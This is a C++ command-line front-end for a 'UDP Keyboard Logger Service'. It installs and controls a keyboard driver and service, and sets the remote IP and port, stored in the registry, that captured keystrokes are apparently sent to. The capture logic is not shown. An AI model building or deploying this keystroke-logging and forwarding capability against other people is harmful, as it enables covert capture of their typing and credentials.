#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <Windows.h>
#include <iostream>
#include <regex>
#include "UdpServiceManager.h"
#include "DriverInstaller.h"
#include "SystemStatus.h"
#include "RegistryConfig.h"
#include "Config.h"

#define LOG_INFO(fmt, ...) wprintf(L"[INFO] " fmt L"\n", ##__VA_ARGS__)
#define LOG_SUCCESS(fmt, ...) wprintf(L"[SUCCESS] " fmt L"\n", ##__VA_ARGS__)
#define LOG_ERROR(fmt, ...) wprintf(L"[ERROR] " fmt L"\n", ##__VA_ARGS__)

void PrintUsage() {
    std::wcout << L"\n=== UDP Keyboard Logger Service ===" << std::endl;
    std::wcout << L"Built with C++20\n" << std::endl;
    std::wcout << L"Usage:" << std::endl;
    std::wcout << L"  UdpLogger install              # Install and start driver + service" << std::endl;
    std::wcout << L"  UdpLogger uninstall            # Stop and uninstall driver + service" << std::endl;
    std::wcout << L"  UdpLogger status               # Check system status" << std::endl;
    std::wcout << L"\n--- Driver Control ---" << std::endl;
    std::wcout << L"  UdpLogger start driver         # Start keyboard driver" << std::endl;
    std::wcout << L"  UdpLogger stop driver          # Stop keyboard driver" << std::endl;
    std::wcout << L"\n--- Service Control ---" << std::endl;
    std::wcout << L"  UdpLogger start service        # Start UDP logger service" << std::endl;
    std::wcout << L"  UdpLogger stop service         # Stop UDP logger service" << std::endl;
    std::wcout << L"\n--- Driver Configuration ---" << std::endl;
    std::wcout << L"  UdpLogger config set <IP> <PORT>   # Set driver IP and port (restarts driver)" << std::endl;
    std::wcout << L"  UdpLogger config show              # Show current configuration" << std::endl;
    std::wcout << L"  UdpLogger config reset             # Reset to defaults (127.0.0.1:31415)" << std::endl;
    
#if DEBUG_LOGGING_ENABLED
    std::wcout << L"\n--- Developer/Debug Commands ---" << std::endl;
    std::wcout << L"  UdpLogger --service            # Run as service (internal use)" << std::endl;
#endif
    
    std::wcout << std::endl;
}

bool ValidateIPAddress(const std::wstring& ip) {
    std::wstring pattern = L"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
    std::wregex regex(pattern);
    return std::regex_match(ip, regex);
}

bool ValidatePort(const std::wstring& port) {
    try {
        int portNum = std::stoi(port);
        return portNum > 0 && portNum <= 65535;
    } catch (...) {
        return false;
    }
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc >= 2 && wcscmp(argv[1], L"--service") == 0) {
        return UdpServiceManager::RunAsService();
    }
    
    if (argc < 2) {
        PrintUsage();
        return 1;
    }
    
    std::wstring command = argv[1];
    
    // === FULL INSTALLATION/UNINSTALLATION ===
    
    if (command == L"install") {
        LOG_INFO(L"Installing UDP Keyboard Logger...");
        
        if (!DriverInstaller::InstallDriverAndService()) {
            LOG_ERROR(L"Installation failed");
            return 1;
        }
        
        LOG_SUCCESS(L"Installation completed successfully");
        std::wcout << L"\nDriver and service are now running." << std::endl;
        std::wcout << L"Use 'UdpLogger status' to check system status." << std::endl;
        
        return 0;
    }
    
    else if (command == L"uninstall") {
        LOG_INFO(L"Uninstalling UDP Keyboard Logger...");
        
        if (!DriverInstaller::UninstallDriverAndService()) {
            LOG_ERROR(L"Uninstallation failed");
            return 1;
        }
        
        LOG_SUCCESS(L"Uninstallation completed successfully");
        
        return 0;
    }
    
    // === STATUS ===
    
    else if (command == L"status") {
        std::wcout << L"\n=== UDP Keyboard Logger - System Status ===" << std::endl;
        std::wcout << std::endl;
        
        auto components = SystemStatus::CheckAllComponents();
        
        int issuesCount = 0;
        for (const auto& component : components) {
            std::wcout << (component.status ? L"[+]" : L"[-]");
            std::wcout << L" " << component.name << L": " << component.details << std::endl;
            if (!component.status) {
                issuesCount++;
                if (!component.fixHint.empty()) {
                    std::wcout << L"    → " << component.fixHint << std::endl;
                }
            }
        }
        
        std::wcout << std::endl;
        if (issuesCount == 0) {
            std::wcout << L"Overall Status: FULLY OPERATIONAL" << std::endl;
        } else {
            std::wcout << L"Overall Status: ISSUES DETECTED" << std::endl;
            std::wcout << L"Problems found: " << issuesCount << std::endl;
        }
        
        return 0;
    }
    
    // === DRIVER CONTROL ===
    
    else if (command == L"start" && argc >= 3 && wcscmp(argv[2], L"driver") == 0) {
        LOG_INFO(L"Starting keyboard driver...");
        
        if (!DriverInstaller::StartDriverService()) {
            LOG_ERROR(L"Failed to start driver");
            return 1;
        }
        
        LOG_SUCCESS(L"Driver started successfully");
        std::wcout << L"\nUse 'UdpLogger status' to verify driver status." << std::endl;
        
        return 0;
    }
    
    else if (command == L"stop" && argc >= 3 && wcscmp(argv[2], L"driver") == 0) {
        LOG_INFO(L"Stopping keyboard driver...");
        
        if (!DriverInstaller::StopDriverService()) {
            LOG_ERROR(L"Failed to stop driver");
            return 1;
        }
        
        LOG_SUCCESS(L"Driver stopped successfully");
        std::wcout << L"\nUse 'UdpLogger status' to verify driver status." << std::endl;
        
        return 0;
    }
    
    // === SERVICE CONTROL ===
    
    else if (command == L"start" && argc >= 3 && wcscmp(argv[2], L"service") == 0) {
        LOG_INFO(L"Starting UDP logger service...");
        
        if (!UdpServiceManager::StartServiceProcess()) {
            LOG_ERROR(L"Failed to start service");
            return 1;
        }
        
        LOG_SUCCESS(L"Service started successfully");
        std::wcout << L"\nUse 'UdpLogger status' to verify service status." << std::endl;
        
        return 0;
    }
    
    else if (command == L"stop" && argc >= 3 && wcscmp(argv[2], L"service") == 0) {
        LOG_INFO(L"Stopping UDP logger service...");
        
        if (!UdpServiceManager::StopServiceProcess()) {
            LOG_ERROR(L"Failed to stop service");
            return 1;
        }
        
        LOG_SUCCESS(L"Service stopped successfully");
        std::wcout << L"\nUse 'UdpLogger status' to verify service status." << std::endl;
        
        return 0;
    }
    
    // === DRIVER CONFIGURATION ===
    
    else if (command == L"config" && argc >= 3) {
        std::wstring subcommand = argv[2];
        
        // config set <IP> <PORT>
        if (subcommand == L"set" && argc >= 5) {
            std::wstring newIP = argv[3];
            std::wstring newPort = argv[4];
            
            if (!ValidateIPAddress(newIP)) {
                LOG_ERROR(L"Invalid IP address format: %s", newIP.c_str());
                std::wcout << L"Example: 192.168.1.100" << std::endl;
                return 1;
            }
            
            if (!ValidatePort(newPort)) {
                LOG_ERROR(L"Invalid port number: %s", newPort.c_str());
                std::wcout << L"Port must be between 1 and 65535" << std::endl;
                return 1;
            }
            
            LOG_INFO(L"Setting driver config: %s:%s", newIP.c_str(), newPort.c_str());
            
            if (!RegistryConfig::WriteDriverConfig(newIP, newPort)) {
                LOG_ERROR(L"Failed to write configuration to registry");
                return 1;
            }
            
            LOG_SUCCESS(L"Configuration saved to registry");
            
            // Restart driver to apply changes
            if (UdpServiceManager::IsDriverServiceRunning()) {
                LOG_INFO(L"Restarting driver to apply changes...");
                
                if (!UdpServiceManager::RestartDriverService()) {
                    LOG_ERROR(L"Failed to restart driver");
                    std::wcout << L"Config saved but driver restart failed." << std::endl;
                    std::wcout << L"Manual restart: UdpLogger stop driver && UdpLogger start driver" << std::endl;
                    return 1;
                }
                
                LOG_SUCCESS(L"Driver restarted successfully");
                std::wcout << L"\nDriver is now using new configuration: " 
                          << newIP << L":" << newPort << std::endl;
            } else {
                std::wcout << L"\nConfiguration saved. Driver is not running." << std::endl;
                std::wcout << L"Start driver to use new config: UdpLogger start driver" << std::endl;
            }
            
            return 0;
        }
        
        // config show
        else if (subcommand == L"show") {
            std::wstring configIP, configPort;
            
            std::wcout << L"\n=== Driver Configuration ===" << std::endl;
            
            if (RegistryConfig::ReadDriverConfig(configIP, configPort)) {
                std::wcout << L"RemoteIP:   " << configIP << std::endl;
                std::wcout << L"RemotePort: " << configPort << std::endl;
                
                if (UdpServiceManager::IsDriverServiceRunning()) {
                    std::wcout << L"\nDriver Status: RUNNING (using above config)" << std::endl;
                } else {
                    std::wcout << L"\nDriver Status: STOPPED" << std::endl;
                }
            } else {
                std::wcout << L"Configuration: NOT SET" << std::endl;
                std::wcout << L"\nDefault values will be used:" << std::endl;
                std::wcout << L"RemoteIP:   " << Config::Driver::DEFAULT_REMOTE_IP << std::endl;
                std::wcout << L"RemotePort: " << Config::Driver::DEFAULT_REMOTE_PORT << std::endl;
            }
            
            std::wcout << std::endl;
            return 0;
        }
        
        // config reset
        else if (subcommand == L"reset") {
            LOG_INFO(L"Resetting driver config to defaults...");
            
            if (!RegistryConfig::WriteDriverConfig(
                Config::Driver::DEFAULT_REMOTE_IP,
                Config::Driver::DEFAULT_REMOTE_PORT)) {
                LOG_ERROR(L"Failed to write default configuration");
                return 1;
            }
            
            LOG_SUCCESS(L"Configuration reset to defaults");
            
            // Restart driver if running
            if (UdpServiceManager::IsDriverServiceRunning()) {
                LOG_INFO(L"Restarting driver to apply defaults...");
                
                if (!UdpServiceManager::RestartDriverService()) {
                    LOG_ERROR(L"Failed to restart driver");
                    std::wcout << L"Config reset but driver restart failed." << std::endl;
                    std::wcout << L"Manual restart: UdpLogger stop driver && UdpLogger start driver" << std::endl;
                    return 1;
                }
                
                LOG_SUCCESS(L"Driver restarted with default config");
            }
            
            std::wcout << L"\nDefault configuration:" << std::endl;
            std::wcout << L"RemoteIP:   " << Config::Driver::DEFAULT_REMOTE_IP << std::endl;
            std::wcout << L"RemotePort: " << Config::Driver::DEFAULT_REMOTE_PORT << std::endl;
            
            return 0;
        }
        
        else {
            LOG_ERROR(L"Unknown config subcommand: %s", subcommand.c_str());
            std::wcout << L"\nAvailable config commands:" << std::endl;
            std::wcout << L"  UdpLogger config set <IP> <PORT>" << std::endl;
            std::wcout << L"  UdpLogger config show" << std::endl;
            std::wcout << L"  UdpLogger config reset" << std::endl;
            return 1;
        }
    }
    
    // === UNKNOWN COMMAND ===
    
    else {
        LOG_ERROR(L"Unknown command: %s", command.c_str());
        PrintUsage();
        return 1;
    }
    
    return 0;
}